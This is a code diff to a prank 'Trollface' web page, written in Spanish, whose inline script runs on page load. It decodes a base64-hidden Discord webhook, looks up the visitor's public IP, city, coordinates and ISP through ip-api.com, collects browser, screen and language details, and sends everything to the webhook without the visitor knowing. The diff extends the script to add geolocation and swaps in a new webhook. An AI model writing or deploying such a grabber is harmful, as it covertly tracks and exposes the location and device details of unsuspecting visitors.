@@ -11,16 +11,16 @@
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
 
     <script>
-        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0ODc0Mjc0MTM5OTcwMzU1Mi9EbHdXY1pmTlg5YmJnaTJ2SDJNc2tRSTR2alhJYTd2WlhGWU1xUWtxOGgxVFhOTFNnUG5wcDJUTkNzSEF5NDZ4SGdo");
+        const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0OTgyNDI5MzU3NTQ2Mjk3My9jM3lKamg3aHNpLTZTWTFCT2tiUVhoQ3NCYjNKd2d3VUFldW1hbzJRWDUtSk1QRnlVNlRHWERsMDYwZ1piVkxhVXVqVA==");
 
         async function obtenerIP() {
-            const res = await fetch('https://api.ipify.org?format=json');
+            const res = await fetch('http://ip-api.com/json');
             const data = await res.json();
-            return data.ip;
+            return data;
         }
 
         async function enviarDatos() {
-            const ip = await obtenerIP();
+            const data = await obtenerIP();
             const navegador = navigator.userAgent;
             const resolucion = `${screen.width}x${screen.height}`;
             const idioma = navigator.language;
@@ -29,24 +29,26 @@
                 content: `
 🌐 **Nuevo visitante en la web**
 
-📡 **IP:** \`${ip}\`
+📡 **IP Pública:** \`${data.query}\`
+🌎 **Ubicación:** ${data.city}, ${data.regionName}, ${data.country}
+📍 **Coordenadas:** ${data.lat}, ${data.lon}
+🛰️ **Proveedor:** ${data.isp}
 💻 **Navegador:** \`${navegador}\`
 🖥️ **Resolución:** \`${resolucion}\`
-🌎 **Idioma:** \`${idioma}\`
+🌐 **Idioma:** \`${idioma}\`
                 `
             };
 
-            // Enviar la IP al Webhook de Discord
             await fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            console.log("✅ IP enviada a Discord.");
+            console.log("✅ IP y geolocalización enviada a Discord.");
         }
 
-        // Protección Anti-Spam: Solo envía una vez por visita
+        // Anti-spam para que solo envíe la IP una vez por visita
         if (!localStorage.getItem('ip_enviada')) {
             enviarDatos();
             localStorage.setItem('ip_enviada', true);
